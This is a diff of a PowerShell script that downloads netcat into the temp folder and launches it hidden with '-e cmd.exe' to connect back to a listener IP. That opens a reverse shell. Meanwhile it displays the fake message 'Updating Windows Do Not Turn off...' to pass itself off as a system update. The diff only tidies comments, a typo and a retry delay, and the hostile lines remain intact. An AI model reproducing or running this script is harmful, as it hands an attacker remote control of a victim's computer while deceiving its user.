@@ -12,18 +12,13 @@ $ncPath = "$env:TEMP\nc.exe"  # Use double quotes for variable expansion
 If (-Not (Test-Path $ncPath)) {
     Write-Host 'Updating Windows Do Not Turn off...'
     Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing
-    Write-Host "Updating Windows Do Not Turn off...l"
+    Write-Host "Updating Windows Do Not Turn off..."
 } else {
     Write-Host "Updating Windows Do Not Turn off..."
 }
 
-# Loop to continuously attempt connection
-
 Write-Host "Updating Windows Do Not Turn off..."
 
-# Attempt to connect using Netcat
 Start-Process $ncPath -ArgumentList "${listenerIP} ${port} -e cmd.exe" -WindowStyle Hidden
 
-# Wait before retrying if connection fails
-Start-Sleep -Seconds 10
 
